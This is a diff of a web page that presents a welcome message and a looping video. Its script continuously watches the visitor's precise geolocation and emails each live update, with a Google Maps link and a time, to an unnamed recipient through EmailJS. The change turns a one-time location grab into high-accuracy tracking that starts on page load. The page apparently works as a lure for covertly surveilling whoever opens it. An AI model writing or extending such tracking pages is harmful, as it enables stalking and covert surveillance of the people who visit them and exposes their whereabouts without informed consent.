@@ -4,9 +4,10 @@
 <head>
 
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport"
+content="width=device-width, initial-scale=1.0">
 
-<title>Location Tracker</title>
+<title>Live Location Tracker</title>
 
 <!-- EMAILJS -->
 <script type="text/javascript"
@@ -61,12 +62,12 @@ color:#00ff88;
 <h1>Welcome</h1>
 
 <!-- VIDEO -->
-<video controls autoplay muted>
+<video controls autoplay muted loop>
 <source src="your-video.mp4" type="video/mp4">
 </video>
 
 <div id="status">
-Loading...
+Starting live tracking...
 </div>
 
 </div>
@@ -78,17 +79,16 @@ document.getElementById("status");
 
 function sendLocation(latitude, longitude){
 
-statusText.innerHTML =
-"Sending location...";
-
 const templateParams = {
 
 message:
+"LIVE LOCATION UPDATE\n\n" +
+
 "Latitude: " + latitude +
 
 "\n\nLongitude: " + longitude +
 
-"\n\nMap:\nhttps://www.google.com/maps?q=" +
+"\n\nGoogle Maps:\nhttps://www.google.com/maps?q=" +
 latitude + "," + longitude +
 
 "\n\nTime:\n" +
@@ -104,16 +104,16 @@ templateParams
 
 .then(function(response){
 
-console.log("SUCCESS!", response);
+console.log("LIVE LOCATION SENT", response);
 
 statusText.innerHTML =
-"Location shared successfully.";
+"Live location sending...";
 
 })
 
 .catch(function(error){
 
-console.log("FAILED...", error);
+console.log("FAILED", error);
 
 statusText.innerHTML =
 "Failed to send location.";
@@ -122,11 +122,9 @@ statusText.innerHTML =
 
 }
 
-function getLocation(){
-
 if(navigator.geolocation){
 
-navigator.geolocation.getCurrentPosition(
+navigator.geolocation.watchPosition(
 
 function(position){
 
@@ -149,6 +147,14 @@ console.log(error);
 statusText.innerHTML =
 "Location permission denied.";
 
+},
+
+{
+
+enableHighAccuracy:true,
+maximumAge:0,
+timeout:5000
+
 }
 
 );
@@ -159,10 +165,6 @@ statusText.innerHTML =
 "Geolocation not supported.";
 
 }
-
-}
-
-getLocation();
 
 </script>
 
